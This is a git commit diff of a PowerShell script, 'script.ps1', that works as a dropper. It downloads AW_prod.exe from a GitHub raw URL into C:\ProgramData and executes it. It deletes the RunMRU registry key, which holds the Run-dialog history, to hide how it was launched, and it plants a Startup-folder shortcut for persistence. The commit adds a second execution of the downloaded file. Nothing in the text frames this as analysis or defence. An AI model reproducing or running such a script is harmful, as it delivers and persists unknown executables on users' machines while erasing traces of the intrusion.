e398aa7af4562113e96f74c10cc800533b8e1240
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2021-12-02 22:09:28 +0600

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -4,13 +4,15 @@ $down = New-Object System.Net.WebClient
 $url = 'https://github.com/qwertyuiopindia/test/blob/main/AW_prod.exe?raw=true'
 $file = "C:\ProgramData\AW_prod.exe"
 $down.DownloadFile($url,$file)
-$exec = New-Object -com shell.application
 Start-Sleep -s 30
+$exec = New-Object -com shell.application
 $exec.shellexecute($file)
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 $objShell = New-Object -ComObject ("WScript.Shell")
 $objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\AW_prod.lnk")
 $objShortCut.TargetPath="C:\ProgramData\AW_prod.exe"
 $objShortCut.Save()
+$exec = New-Object -com shell.application
+$exec.shellexecute($file)
 exit
 
